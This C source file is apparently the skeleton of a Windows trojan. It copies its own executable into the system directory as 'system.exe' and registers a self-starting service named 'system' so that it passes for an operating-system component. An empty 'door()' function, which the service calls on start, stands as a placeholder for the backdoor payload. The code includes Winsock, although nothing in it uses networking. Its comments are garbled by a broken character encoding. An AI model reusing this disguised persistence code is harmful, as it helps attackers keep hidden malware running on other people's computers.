#include<stdio.h>
#include<winsock2.h>
#pragma comment(lib, "ws2_32.lib")
void WINAPI ServiceMain(DWORD, LPTSTR *);
void WINAPI ServiceCtrlHandler(DWORD Opcode);
BOOL InstallCmdService();
void DelServices();
void door();
SERVICE_STATUS m_ServiceStatus;
SERVICE_STATUS_HANDLE m_ServiceStatusHandle;
BOOL bRunning = true;
int main(int argc, char * argv[])
{
	SERVICE_TABLE_ENTRY DispatchTable[] = 
	{
		{"system", ServiceMain},
		{NULL, NULL}
	};
	if(argc == 2)
	{
		if(!stricmp(argv[1], "-1"))//����ڶ�����������-install
		{
			InstallCmdService();
		 } 
		else if(!stricmp(argv[1], "-r"))
		{
			DelServices();
		 } 
		return 0; 
	}
	StartServiceCtrlDispatcher(DispatchTable);//����ڵ�ĵ�ַ����
	return 0; 
}
void door()
{
//ľ����������� 

}
void WINAPI ServiceMain(DWORD dwArgc, LPTSTR *lpArgv)//���������� 
{	//��ʼ���������ڿ�ʼ 
	m_ServiceStatus.dwServiceType = SERVICE_WIN32;
	m_ServiceStatus.dwCurrentState = SERVICE_START_PENDING;
	//������Խ��ܵ�������������ֻ����ֹͣ�����������ͣ�ָ����� 
	m_ServiceStatus.dwControlsAccepted = SERVICE_ACCEPT_STOP | SERVICE_ACCEPT_PAUSE_CONTINUE;;
	m_ServiceStatus.dwWin32ExitCode = 0;
	m_ServiceStatus.dwServiceSpecificExitCode = 0;
	m_ServiceStatus.dwCheckPoint = 0;
	m_ServiceStatus.dwWaitHint = 0;
	m_ServiceStatusHandle = RegisterServiceCtrlHandler("system", ServiceCtrlHandler);
	//ServiceCtrlHandler������ƺ�������������ʼ���ָ�����ͣ��ֹͣ����ȿ��Ʋ��� 
	if(m_ServiceStatusHandle == (SERVICE_STATUS_HANDLE)0)return;
	//���÷���״̬
	m_ServiceStatus.dwCurrentState = SERVICE_RUNNING;
	m_ServiceStatus.dwCheckPoint = 0;
	m_ServiceStatus.dwWaitHint = 0;
	//�������ServiceStatus()����Ӧ������Ƴ���ÿ�ε�����֪ͨ��ServiceStatus�ṹ����7����Ա�����Ƿ�Ӧ���������״̬
	//���еĳ�Ա���ڽṹ�����ݵ�SetServiceStatus֮ǰ��ȷ���� 
	if(SetServiceStatus (m_ServiceStatusHandle, &m_ServiceStatus))
		bRunning = true;
		door();  //�������ǵķ��� 
		return; 
}
//������ƺ���
void WINAPI ServiceCtrlHandler(DWORD Opcode)
{
	switch(Opcode)
	{
		case SERVICE_CONTROL_PAUSE:   //ʹ��pause������ֹ����
			m_ServiceStatus.dwCurrentState = SERVICE_PAUSED;
		 	break;
		case SERVICE_CONTROL_CONTINUE:  //ʹ��continue�����������
			m_ServiceStatus.dwCurrentState = SERVICE_RUNNING;
			break;
		case SERVICE_CONTROL_STOP:   //ʹ��stopֹͣ���� 
			m_ServiceStatus.dwWin32ExitCode = 0; 
			m_ServiceStatus.dwCurrentState = SERVICE_STOPPED;
			m_ServiceStatus.dwCheckPoint = 0;
			m_ServiceStatus.dwWaitHint = 0;
			SetServiceStatus (m_ServiceStatusHandle, &m_ServiceStatus);
			bRunning = false;
			break;
		case SERVICE_CONTROL_INTERROGATE:
			break;
			
	}
	return;
 } 

//��װ������
BOOL InstallCmdService()
{
	char strDir[1024];
	SC_HANDLE schSCManager, schService;
	GetCurrentDirectory(1024, strDir);
	GetModuleFileName(NULL, strDir, sizeof(strDir));
	char chSysPath[1024];
	GetSystemDirectory(chSysPath,sizeof(chSysPath));
	strcat(chSysPath,"\\system.exe");
	if(CopyFile(strDir,chSysPath,FALSE)) //�ѷ�������Ƶ�ϵͳ��Ŀ¼���������� 
		printf("Copy file OK\n");
	strcpy(strDir,chSysPath);
	schSCManager = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
	if(schSCManager == NULL)
	{
		printf("open scmanager failed, maybe you do not have the privilege to do this\n");
		return false; 
	 } 
	LPCTSTR lpszBinaryPathName = strDir;
	//��������Ϣ��ӵ�SCM�����ݿ⣬������Ϊsystem����ʾ������Ϊsystem
	schService = CreateService(schSCManager, "system", 
	"system",  //���������Ϣ��ӵ�SCM�����ݿ���
	SERVICE_ALL_ACCESS,  //����Ȩ��
	SERVICE_WIN32_OWN_PROCESS,  //��������
	SERVICE_AUTO_START,   //��������
	SERVICE_ERROR_NORMAL,   //�����������
	lpszBinaryPathName,   //������
	NULL,
	NULL,
	NULL,
	NULL,
	NULL 
	);
	if(schService)
		printf("Install Service Success!\n");
	else
		return false;
	CloseServiceHandle(schService);
	return true;
 } 
//ɾ��������
void DelServices()
{
	char name[100];
	SC_HANDLE scm;
	SC_HANDLE service;
	SERVICE_STATUS status;
	strcpy(name, "system");
	if((scm = OpenSCManager(NULL, NULL, SC_MANAGER_CREATE_SERVICE)) == NULL)
	{
		printf("OpenSCManager Error");
	}
	service = OpenService(scm, name, SERVICE_ALL_ACCESS | DELETE);
	if(!service)
	{
		printf("OpenService error!");
		return;
	}
	BOOL isSuccess = QueryServiceStatus(service, &status);
	if(!isSuccess)
	{
		printf("QueryServiceStatus error!");
		return;
	}
	if(status.dwCurrentState != SERVICE_STOPPED)
	{
		isSuccess = ControlService(service, SERVICE_CONTROL_STOP, &status);
		if(!isSuccess)
			printf("Stop Service error!");
		Sleep(500);
	}
	isSuccess = DeleteService(service);
	if(!isSuccess)
		printf("Delete Service Fail!");
	else
		printf("Delete Service Success!");
	CloseServiceHandle(service);
	CloseServiceHandle(scm);
 } 













 
